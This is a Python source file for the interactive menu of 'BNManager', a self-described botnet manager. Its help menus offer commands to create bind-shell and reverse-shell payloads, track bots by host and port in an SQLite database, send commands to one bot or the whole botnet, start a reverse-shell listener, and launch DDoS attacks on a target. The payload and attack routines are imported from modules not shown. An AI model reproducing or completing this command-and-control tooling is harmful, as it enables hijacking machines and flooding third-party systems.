from termcolor import cprint
from os import system
from create_Bot import reverse, bind
import editBot
import operate
import sqlite3


def main():
    system('clear')
    banner()
    cprint("Do \'help\' for manual page", "yellow")
    main_menu()


def main_menu():
    while True:

        cprint("bnmanager> ", "red", attrs=["bold"], end="")
        try:
            user_input = input().lower()
        except KeyboardInterrupt:
            cprint("Ctrl+C is disabled. Type \'exit\' to exit this program", "yellow")
            continue
        if user_input == "help":
            help()
        elif user_input == "create":
            createBot()
        elif user_input == "stats":
            botStatus()
        elif user_input == "operate":
            operateBots()
        elif user_input == "exit":
            exit_function()
        elif user_input == "":
            pass
        else:
            cprint("Invalid Input, type \'help\' for help menu", "yellow")


def banner():
    system('clear')
    print(
        """\n\n______ _   _ ___  ___                                  
| ___ \ \ | ||  \/  |                                  
| |_/ /  \| || .  . | __ _ _ __   __ _  __ _  ___ _ __ 
| ___ \ . ` || |\/| |/ _` | '_ \ / _` |/ _` |/ _ \ '__|
| |_/ / |\  || |  | | (_| | | | | (_| | (_| |  __/ |   
\____/\_| \_/\_|  |_/\__,_|_| |_|\__,_|\__, |\___|_|   
                                        __/ |          
                                       |___/           
                                                                                                                              
                                                                                                                              """
    )


def createBot():
    def help_menu_createBot():
        cprint("\nHelp menu for Creating a Bot\n", attrs=["bold"])
        cprint("bind\t\t", attrs=["bold"], end="")
        cprint("For creating bind shells")
        cprint("reverse\t\t", attrs=["bold"], end="")
        cprint("For creating reverse shells")
        cprint("back\t\t", attrs=["bold"], end="")
        cprint("For going back to previous module")
        cprint("exit\t\t", attrs=["bold"], end="")
        cprint("For Exiting the Manager")

    while True:

        cprint("bnmanager/CreateBot> ", "red", attrs=["bold"], end="")
        try:
            user_input = input().lower()
        except KeyboardInterrupt:
            cprint(
                "Ctrl+C is disabled. You can either \'back\' or \'exit\' instead. Type 'help for more info.",
                "yellow",
            )
            continue
        if user_input == "bind":
            bind.bot_selector()
        elif user_input == "reverse":

            reverse.bot_selector()
        elif user_input == "help":
            help_menu_createBot()
        elif user_input == "back":
            return 0
        elif user_input == "exit":
            exit_function()
        elif user_input == "":
            continue
        else:
            cprint("Invalid Input, type \'help\' for help menu", "yellow")


def botStatus():
    """
    Edit Bots
    """
    while True:
        cprint("List of all the bots: ", attrs=["bold"])
        conn = sqlite3.connect('bnmanager.sqlite')
        cursor = conn.execute("SELECT ID, Pay_name, host, port FROM bind")

        print(
            "{:<{id_width}} {:<{name_width}} {:<{host_width}} {:<{port_width}}".format(
                "ID",
                "Name",
                "Host",
                "Port",
                id_width=2,
                name_width=10,
                host_width=15,
                port_width=6,
            )
        )
        print("-" * (2 + 10 + 15 + 6))  # Total width of the columns

        for bot in cursor:
            print(
                "{:<{id_width}} {:<{name_width}} {:<{host_width}} {:<{port_width}}".format(
                    *bot, id_width=2, name_width=10, host_width=15, port_width=6
                )
            )

        try:
            cprint(
                "Enter the index of bot, which you want to view/edit. Do \'back\' or \'exit\' to change module.",
                attrs=["bold"],
            )
            cprint("bnmanager/View[or]EditBot> ", "red", attrs=["bold"], end="")
            user_input = input()
            if user_input == 'back':
                return 0
            elif user_input == 'exit':
                exit_function()
            elif user_input.isnumeric():
                editBot.edit_Selected_Bot(user_input)
            elif user_input == "":
                continue
            else:
                cprint("Invalid Input.", "yellow")
        except KeyboardInterrupt:
            cprint(
                "Ctrl+C is disabled. You can either \'back\' or \'exit\' instead. Type 'help for more info.",
                "yellow",
            )
            continue


def operateBots():
    """
    manage entire botnet
    manage individual bots
    """

    def help_menu_operateBot():
        cprint("\nHelp menu for Operating your Bots\n", attrs=["bold"])
        cprint("single\t\t", attrs=["bold"], end="")
        cprint("For Operating a single Bot")
        cprint("ddos\t\t", attrs=["bold"], end="")
        cprint("For DDOS-ing a target")
        cprint("all\t\t", attrs=["bold"], end="")
        cprint("For sending command to entire botnet")
        cprint("reverse\t\t", attrs=["bold"],end="")
        cprint("For starting the reverse shell listener")
        cprint("back\t\t", attrs=["bold"], end="")
        cprint("For going back to previous module")
        cprint("exit\t\t", attrs=["bold"], end="")
        cprint("For Exiting the Manager")

    while True:

        cprint("bnmanager/OperateBot> ", "red", attrs=["bold"], end="")
        try:
            user_input = input().lower()
        except KeyboardInterrupt:
            cprint(
                "Ctrl+C is disabled. You can either \'back\' or \'exit\' instead. Type 'help for more info.",
                "yellow",
            )
            continue
        if user_input == "single":
            operate.single()
        elif user_input == "ddos":
            operate.ddos()
        elif user_input == "all":
            operate.all()
        elif user_input == "reverse":
            operate.rev()
        elif user_input == "help":
            help_menu_operateBot()
        elif user_input == "back":
            return 0
        elif user_input == "exit":
            exit_function()
        elif user_input == "":
            continue
        else:
            cprint("Invalid Input, type \'help\' for help menu", "yellow")
    # print("")


def help():
    cprint("\nHelp Menu\n", attrs=["bold"])
    cprint("help\t\t", attrs=["bold"], end="")
    cprint("Displays this menu")
    cprint("create\t\t", attrs=["bold"], end="")
    cprint("Creating a payload for new bot")
    cprint("stats\t\t", attrs=["bold"], end="")
    cprint("To view and edit your bots")
    cprint("operate\t\t", attrs=["bold"], end="")
    cprint("To operate your botnet/bots")
    cprint("exit\t\t", attrs=["bold"], end="")
    cprint("For exiting the Manager")


def exit_function():
    cprint("Exiting manager... See you soon!", "green", attrs=["bold"])
    exit(0)


if __name__ == "__main__":
    main()
